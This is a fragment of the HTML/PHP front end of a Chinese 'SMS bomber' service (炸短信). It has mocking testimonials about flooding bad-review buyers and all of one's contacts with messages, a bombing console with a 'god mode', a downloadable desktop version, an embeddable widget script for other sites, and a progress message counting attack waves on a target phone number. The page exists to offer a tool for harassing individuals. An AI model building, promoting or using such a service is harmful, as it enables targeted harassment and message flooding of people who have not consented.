...
<body>
<div class="container">
<h1>炸短信 <sup>BETA</sup></h1><hr />
    <blockquote>
        <p>炸短信, 真的很好用! 自从我轰炸了那些差评买家, 每天腰不疼了, 腿不酸了, 现在全是好评!</p>
        <small>淘宝卖家</small>
    </blockquote>
    <blockquote>
        <p>唉, 缺德事做多了, 总感觉有些人在背后损我 , 我把所有联系人都轰炸了一次 , 这不 , 我笑得乐开了花!</p>
        <small>麻花疼</small>
    </blockquote>
<div class="panel panel-success">
    <div class="panel-heading">
        <h3 class="panel-title">轰炸控制台　有问题找客服：<a target="_blank" href="http://wpa.qq.com/msgrd?v=3&uin=690204663&site=qq&menu=yes"><img border="0" src="http://pub.idqqimg.com/qconn/wpa/button/button_111.gif" alt="联系客服" title="联系客服"/></a><span class="label label-success" style="float: right;" onclick="window.open('http://www.fucksms.tk/', '_new')"><strong>由炸短信强力驱动</strong></span></h3>
    </div>
    <div class="input-group">
        ...
        <button type="button" class="btn btn-warning" onclick="top.location='/god/'">启动上帝模式</button>
		<button type="button" class="btn btn-info" onclick="top.location='http://www.fucksms.tk/fucksms.zip'">★软件版下载</button>
		<span class="label label-danger"><strong>手机版请直接访问即可！</strong></span>
		</div>
		</form>
...
炸短信线程已启动！轰炸 <strong>$d</strong> , 第 <strong>$a</strong> 波攻击 , 已轰炸 <strong>N</strong> 次(不信请测试自己的手机号). <a href='#faq' target='_blank'><i>常见问题</i></a>
</div>
</div>";
...
<div class="bs-callout bs-callout-info">
    <h4>友情链接</h4>
    <p><a href="http://5yuns.com">乌云博客</a></p>
</div>
...
<div class="bs-callout bs-callout-info">
    <h4>开发接口</h4>
    <p>
        您可以使用下面的代码将 <a href="/mini/">迷你轰炸台</a> 嵌入到网站中
        <pre>&lt;script src="http://www.fucksms.tk/api/js"&gt;&lt;/script&gt;</pre>
    </p>
</div>
</div>
...
(function() {
    ...
    c.async = true;
    c.src = ('https:' == document.location.protocol ? 'https://' : 'http://') + 'www.clicki.cn/boot/49735';
